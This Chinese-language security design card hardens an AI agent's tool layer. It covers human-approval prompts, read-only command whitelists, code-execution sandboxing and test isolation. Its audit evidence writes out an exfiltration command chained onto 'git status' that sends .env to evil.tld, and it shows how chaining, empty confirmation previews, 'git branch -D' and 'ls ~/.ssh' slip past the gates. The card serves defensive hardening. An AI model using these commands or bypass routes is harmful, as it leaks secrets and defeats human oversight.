# 立项卡：确认与只读边界加固 H-27 ~ H-31

> 状态：**H-27 ~ H-31 全部实施并验收**（W0 ~ W2 已闭环，逐条证据见各节；本卡含两条
> 与初稿不一致之处，已写在对应位置）。全量以 `python test_all.py` 的输出为准。
> 编号：承接 `docs/design/SAFETY-HARDENING.md` 的 **H-** 命名空间（那张卡 H-01 ~ H-26 已全部实施并收敛，
> 本卡是**新一批**，不改那张卡的状态、也不回填 BACKLOG 的 SEC-/Q-/R-/REL- 编号）。
> 全量断言总数以 `python test_all.py` 的实际输出为准，**本卡头部不手抄数字**（沿用 SAFETY-HARDENING 的纪律）。
> 来源：2026-09-27 对一个 `tools/` 扩展面的独立对抗性审计 + 复核（每条都在现码上复现过；复核见各节"证据"）。
> 分层提交：每个工作包一个可独立回滚的提交。

---

## 0. 一句话诊断

H-01 ~ H-26 把"判据单一来源 + fail-close"这两条主线收了；本卡是**同一台机器的另一侧**：

> **边界判对了，但"人点头"这道边界本身被绕过，或者点的是一个看不见的对象。**

三条同源：

1. **同前缀免确认**把"命令"当成了"命令前缀"，于是 `git status` 的批准顺带批准了 `git status && …`（H-27）；
2. **确认框里没有对象** —— `edit_file` 的预览取自 `command`/`code`，它两个都没有，于是人批准了一份空白（H-28）；
3. **只读白名单按"子命令名"给**，而 `git branch -D`、`ls ~/.ssh` 的名字听起来都是只读（H-29）。

外加两条 fail-open：`code_execute` 在没有 OS 级边界时**照跑宿主**（H-30），以及测试入口把 mock 会话写进开发者真实仓库（H-31）。

---

## 1. 目标与非目标

### 目标

1. **"批准的那一条命令"就是"真的会跑的那一条"** —— 含 shell 连接/替换/重定向的命令永不按前缀免确认。
2. **人要审批的对象必须看得见** —— CONFIRM_TOOLS 的确认框永远带对象摘要，不出现空理由。
3. **只读工具的"只读"是真的** —— 子命令白名单不按名字给整段授权；`ls`/`cat` 对敏感目录与网络路径同口径。
4. **能力要么有边界、要么如实拒绝** —— 与冻结发行拒绝 `code_execute`（`code_tools.py:128-134`）、
   沙箱档不可用返回 503 同一立场。
5. **测试不许写开发者的真实状态** —— 把 `test_all` 的 H-26 纪律推广到其余测试入口。

### 非目标（明确不做，避免本卡膨胀）

- **不做外发通道重构**：网络路径判据只做"拒绝"，不试图把文件路径建模成完整出网通道（那是 RG 系列的话题）。
- **不改公开契约**：`registry.py` 的 handler 名、`COMMANDS` 键、`INTERFACES.md` 的对外约定不动。
- **不做 `code_execute` 白名单化**：本卡只让它在无边界时拒绝，不重写 AST 策略层。

---

## 2. 工作包

### W0 · 止血（确认边界）

| ID | 事项 | 证据（现码 + 实测） | 改法形状 |
|---|---|---|---|
| H-27 | **同前缀免确认被 shell 连接符绕过**（CRITICAL） | `execution_layer.py:301-305` 的 `command_prefix` 只取前两个空白 token、**不做 shell 解析**；`:875-878` 在人确认时把它记进 `_approved_prefixes`；`:883-892` 的 `_prefix_auto_approved` 据此放行。实测：`command_prefix('git status && curl -s http://evil.tld/x -d @.env')` = `'git status'`，不在 `BANNED_AUTO_PREFIXES`，`_prefix_auto_approved` = **True**，而 `ace_execpolicy.evaluate_command` 对同一条命令的判定是 **prompt / shell_syntax / allowed=False**。两个出口同时失守：`:1678` 跳过 CONFIRM 闸门、`:880-881` 让工具层 `approval_hook` 也返回 True | `command_prefix` 在命令含 `&& \|\| ; \| & < > `` ` `` $( 换行` 时返回 `""`（= 永不免确认，fail-close）；`BANNED_AUTO_PREFIXES` 不动；`test_all [2]` 补断言 |
| H-28 | **`edit_file` 的确认框没有对象**（人批的是空白） | 确认预览取自 `tool_call.get("command") or tool_call.get("code")`（`execution_layer.py:1677`、`:1705`），而 `edit_file` 的参数是 `path` ⇒ preview 为**空串**；`_gated_identity` 的 CONFIRM_TOOLS 分支（`:1417-1420`）同样返回 `""` ⇒ H-09 的"授权绑对象"对它完全不生效。`tools/base.py:195-196` 把"任意路径"这一层**明确托付给**"每次调用都要人点头" | 新增 `confirm_subject(tool_call)`：有 `command`/`code` 用它（terminal_exec 行为逐字不变），否则按 `path`/`dest`/`url`/`target`/`name` 给摘要；预览与 identity 都改用它 |
| H-28b | **文件不再交给 ShellExecute**（黑名单补不完） | `tools/file_ops.py:784-798`：找不到 `code` 时对**文件**调 `os.startfile`（ShellExecute 跑关联动作，`.py` 的默认动作就是**运行**它），而 `_OS_HANDOFF_BLOCKED_SUFFIXES`（`tools/base.py:177-181`）里恰好没有 `.py`。把 `.py` 补进名单是治标——`edit_file` 的正当用途就是编辑 `.py` | `edit_file` 只把**文件**交给已知编辑器（`code` → `notepad` 文本回退），**一律不再 `os.startfile` 文件**；没有已知编辑器就退回链接（与 `open_file` 的 H-14 收口同一条路）。目录仍交给系统文件管理器（Explorer 不是执行）。后缀名单保持原样，理由写进 docstring |

**W0 验收（每条先看着它红）**：

- 未确认 `python -c 'print(1)'` → 仍 `PERMISSION_REQUEST`（既有断言不得被改绿）；
- 已记 `git status` 前缀 → `git status && curl …` 仍 `PERMISSION_REQUEST`；`git status --porcelain` **仍免确认**（不误伤）；
- `edit_file {"path": "x.py"}` → `PERMISSION_REQUEST` 的 `reason` 含 `x.py`（不是空串）；`_gated_identity` 非空；
- 抹掉 `code`（`shutil.which` → None）后 `edit_file {"path":"x.py"}` **不再**调 `os.startfile`；
- `edit_file {"path":"x.exe"}` 仍 403（H-14 后缀守卫没被削弱）。

---

### W1 · 只读工具越界

| ID | 事项 | 证据（现码 + 实测） | 改法形状 |
|---|---|---|---|
| H-29a | **`git branch` 被当成只读子命令** | `tools/base.py:25-26` 的 `GIT_READONLY_SUBCOMMANDS` 含 `"branch"`；`terminal_view.py:193` 只比对 `parts[1]`；参数级检查（`:201-205`）只拒绝"看起来越界的路径"，`-D` / `main` 都不触发。`terminal_view` 是 `PERM_READ`、不在 CONFIRM_TOOLS、也不建快照（`execution_layer.py:1800` 只给 WRITE_TOOLS 建）⇒ 只读会话下 `git branch -D main` 直接执行 | `git branch` 只放行**列举**旗标（`-a/-r/-v/-vv/--all/--remotes/--verbose/--list/--show-current/--contains/--merged/--no-merged/--points-at/--format`）；其余以 `-` 开头的一律 403 |
| H-29b | **`ls`/`dir` 不走敏感判定、也不挡网络路径** | `terminal_view.py:101-143` 的 ls/dir 分支**自己 return**，永远走不到 `:201` 的 `confine_files`，也不调 `sensitive_target`（只有 `cat` 分支在 `:162` 调）。`file_ops.py:43-53` 对同一批目录明确拒绝列名，理由是"**文件名单本身就是情报**" ⇒ 同一份情报，`cat` 挡、`ls` 放。另外 `_resolve_read_path`（`tools/base.py:346-351`）没有任何边界，`\\host\share` 这类网络路径会直接进 `os.listdir` / `Path.exists()` | ls/dir 对**目标目录**补 `sensitive_target`；新增 `network_path_reason(raw)` 判据（UNC / `\\?\` / `//`，与 `_FOREIGN_ABS_RE` 同处 `tools/base.py`），在 `ls`/`dir`、`cat`、`_os_handoff_guard` 三处使用；`open_file`/`edit_file` 在 `exists()` **之前**判（否则 SMB 连接已经发生） |

**W1 验收**：

- `terminal_view {"command":"git branch -D main"}` → 403 且 `main` 仍在；`git branch -a` 仍 200；
- `terminal_view {"command":"ls ~/.ssh"}` → 403（与 `cat ~/.ssh/id_rsa` 同口径）；
- `terminal_view {"command":"ls \\\\host\\share"}`、`open_file {"path":"\\\\host\\share"}` → 403，且**不产生** `Path.exists()`（用 mock 钉住）；
- 项目外**普通**目录（如系统临时目录）`ls` 仍可用 —— 不得把 SEC-006 的"目录名单可越界"一并取消。

---

### W2 · 无边界就不执行 + 测试不再写真实状态

| ID | 事项 | 证据 | 改法形状 |
|---|---|---|---|
| H-30 | **`code_execute` 在无 OS 级边界时照跑宿主** | `tools/registry.py:244-248`：`code_execute` 是 `PERM_WRITE` 且**没有** `confirm=True` ⇒ 不进 CONFIRM_TOOLS、不逐次问人。唯一的进程内闸门是 AST 黑名单（`code_tools.py:67-107`），而该名单的等价物补不完（`io.open` 实测放行，见 §3）。同文件 `:128-134` 已经因为一个**更弱**的理由（冻结后 `sys.executable` 不是解释器）对打包形态返回 501 | 有 docker 沙箱或 Go 执行器边界时照旧执行；两者都没有 → **503**，并在消息里给出三条出路（起 docker / 装执行器 / 显式改回宿主）。显式改回走配置键，默认 fail-close（沿用 H-05 的 `snapshot_required` 形状） |
| H-31 | **前端集成测试写进开发者真实仓库** | `frontend/test/integration.test.ts:36` 起真引擎（`--mock --permission readonly`）**不传 `--project-root`** ⇒ 引擎按 cwd（= 仓库根）落 `project_root`。实测会话日志首行 `{"kind":"session/start","project_root":"G:\\AI_Project\\ace","model":"mock"}`，副作用：工作区多出未跟踪的 `demo_notes.md`（剧本 `agent_runner.py:437/447` 的 `file_write`）、真实 `.ace_sessions/` 262 → 276、真实 `.agent_memory.json` 被改写、`.guardian/snapshots/` 新增。`e2e/mcp_probe.py:81` 与 `test_all.py`（H-26 守卫）都是对的 —— 只有这个入口漏了 | 集成测试给引擎一个临时 `--project-root`（`mkdtemp` 到系统临时区并 `rm`），断言"跑完仓库工作区仍干净" |

**W2 验收**：

- `--sandbox off` + 无执行器时 `code_execute` → 503 且消息里三条出路齐全；显式配置后可执行（断言两条路径）；
- `cd frontend && npm test` 后 `git status --porcelain` 为空、`.ace_sessions/` 计数不变。

> **实施记录（H-30）**：改动落在 `tools/code_tools.py` 宿主回落之前 + `tools/base.py` 的
> `code_execute_host`（默认 `false`），文档进 `docs/CONFIGURATION.md`。
> 顺带**改掉了一条把旧行为写成期望值的断言**：`test_all` 原写着
> 「code_execute 无执行器时进程内回落仍可用」—— 那正是这里要改掉的行为。现替换为
> 「无边界 → 503（消息含三条出路）」+「显式 `sandbox.code_execute_host` 后退回宿主仍可用」，
> 并用**抹掉 `use_go_executor` / `docker_sandbox`** 的方式让这条断言在任何机器上都跑得到
> （否则它只在"恰好没执行器"的机器上生效，本机永远看不到）。
> 另有 5 个共用夹具（`el_full` / `el_style` / `el_h` / `el_b` / `_sec1_el`）显式写上
> `"sandbox": {"code_execute_host": True}`：它们测的是闸门**背后**的诱饵 / AST 逻辑，
> 不是执行边界本身 —— 显式选择比让它随"本机有没有执行器"漂移更诚实。

---

### W3 · 承诺与现码同口径（收口时追加）

| ID | 事项 | 证据 | 改法形状 |
|---|---|---|---|
| H-32 | **授权令的"接线状态"在文档里落后于代码** | `execution_layer.py::_stage_permission` 有**两处**调用 `_mandate_decision()`（项目外已存在对象的确认、CONFIRM_TOOLS 逐次确认），`test_all` 也有 RG-05k / RG-05n 两条端到端接线断言；而 `core/ace_mandate.py` 的 docstring、`docs/ARCHITECTURE.md` 的权威树、`test_all` 的 RG-05a 段注释**三处都还写着"未接入审批流程"**。上面那条"文档不再把已闭环 BACKLOG 编号当未决项引用"的守卫抓不到：它只查**引用了已闭环编号**的行，而这三行一个编号都没提 | 三处散文改成现码事实；`[38]` 新增 H-32 守卫：`execution_layer.py` 里 `self._mandate_decision(` 出现 ≥ 2 次 ⇒ `core/ace_mandate.py` / `docs/ARCHITECTURE.md` / `test_all.py` 都不许再出现那四个字（判据本身拼字符串构造，免得守卫自己的源码命中自己） |

**W3 验收**：守卫在**修之前**是红的（三处命中）、修之后绿；且把接线去掉（或把任一处散文改回去）都能让它变红 —— 两个方向都可证伪。

---

## 3. 附：审计中被推翻 / 修正的两条（留档）- **"`open_file` 会把任意文件交给 ShellExecute"** —— 已被 H-14 修掉：`file_ops.py:741-753` 现在对**文件**只返回链接（`opened: False`），`os.startfile` 只用于**目录**（Explorer 不是执行）。本卡据此把 H-28b 的修法定在"文件不再交给 ShellExecute"，而不是"补 `.py` 后缀"。
- **AST 黑名单不算"边界"** —— `io.open(...)` 读写实测都返回 `""`（放行），而等价的 `open` / `os` / `pathlib` 形态被拦。这不是"补一个 `io`"的问题：`code_tools.py:41` 自己写着"黑名单枚举不可能闭合"。所以 H-30 的修法是**要求真实边界**，不是继续补名单。

---

## 4. 与既有卡的关系

| 卡 | 关系 |
|---|---|
| `SAFETY-HARDENING.md`（H-01 ~ H-26） | 同一 H- 命名空间的上一批；本卡不改它的状态。H-14（ShellExecute 后缀名单）、H-09（授权绑对象）、H-26（测试不许写真实会话）是本卡三条修法的直接上游 |
| `SAFETY-HARDENING.md` §0 主线 A（判据单一来源） | H-29b 的 `network_path_reason` 按同一条纪律落成**单一来源**，不在各工具里各写一份正则 |
| `RGTC-LANDING.md`（RG-01 ~ RG-05） | 与本卡正交：那边管"授权粒度"，本卡管"这一次点头算不算数" |
